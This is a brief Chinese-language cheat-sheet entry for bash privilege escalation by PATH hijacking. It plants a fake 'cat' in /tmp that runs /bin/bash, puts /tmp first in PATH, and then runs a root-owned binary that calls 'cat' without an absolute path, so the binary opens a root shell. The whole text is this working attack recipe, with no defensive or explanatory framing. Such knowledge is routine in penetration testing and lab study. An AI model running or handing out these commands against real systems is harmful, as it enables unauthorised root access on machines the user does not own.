# bash提权的命令 (前提是没有绝对路径 有root权限的二进制程序)
echo '/bin/bash' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH
echo $PATH
运行有root权限的二进制程序
